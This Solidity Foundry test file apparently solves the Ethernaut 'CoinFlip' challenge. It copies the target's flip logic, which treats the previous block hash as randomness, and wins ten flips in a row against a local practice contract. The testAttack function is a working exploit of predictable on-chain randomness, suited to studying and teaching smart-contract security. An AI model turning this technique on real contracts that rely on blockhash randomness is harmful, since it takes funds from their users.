// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/CoinFlip.sol";

contract CoinFlipContract is Test {
    CoinFlip public coinflip;
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address payable p1 =
        payable(address(0x35524A1a02D6C89C8FceAd21644cB61b032BD3DE));

    // @dev funds p1 with amount in ether
    function fund(uint256 _amount) public payable returns (bool) {
        bool sent = p1.send(_amount * 1 ether);
        require(sent, "funding tx did not work");
        require(p1.balance == 1 ether, "p1 does not have 1 eth");
        return sent;
    }

    // @dev setup function runs before each test
    function setUp() public {
        // owner of contract will be zero address
        coinflip = new CoinFlip();
    }

    // @ dev flip function copy pasted from other contract
    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }

    /* @dev
        1. Guesses the correct outcome of a coinflip 10 times in a row
    */
    function testAttack() public payable {
        bool guess = true;
        bool correctGuess;
        vm.roll(1005672);
        for (uint256 i = 0; i < 10; i++) {
            vm.roll(1005672 + i);
            correctGuess = flip(guess);
            coinflip.flip(correctGuess);
        }
        assertEq(coinflip.consecutiveWins(), 10);
    }
}
